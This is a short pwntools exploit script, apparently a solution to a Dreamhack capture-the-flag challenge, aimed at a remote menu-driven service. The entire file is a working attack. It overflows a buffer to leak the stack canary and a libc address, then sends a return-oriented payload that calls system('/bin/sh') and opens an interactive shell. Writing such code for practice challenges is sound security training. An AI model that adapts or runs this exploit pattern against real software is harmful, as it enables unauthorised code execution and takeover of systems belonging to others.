from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 24340
r = remote(HOST, PORT)

def view(num):
    r.sendlineafter(b'>> ', b'1')
    r.sendlineafter(b': ', b'%d'%num)

def edit(num, val):
    r.sendlineafter(b'>> ', b'2')
    r.sendlineafter(b': ', b'%d'%num)
    r.send(val)

edit(0, p64(0xffffffffffffffff))
edit(1, b'A'*0x80)

edit(1, b'A'*0x89)
view(1)

r.recvuntil(b'A'*0x89)
canary = u64(r.recv(7).ljust(8,b'\x00')) << 8

edit(1, b'A'*0x98)
view(1)

r.recvuntil(b'A'*0x98)
libc = u64(r.recvline().strip().ljust(8,b'\x00')) - 0x2a1ca

binsh = libc + 0x1cb42f
system = libc + 0x58750
pop_rdi = libc + 0x10f75b
ret = libc + 0x2882f

payload = flat([
    b'A'*0x88,
    canary,
    0,
    ret,
    pop_rdi,binsh,
    system
])

edit(1, payload)

r.sendlineafter(b'>> ', b'3')

r.interactive()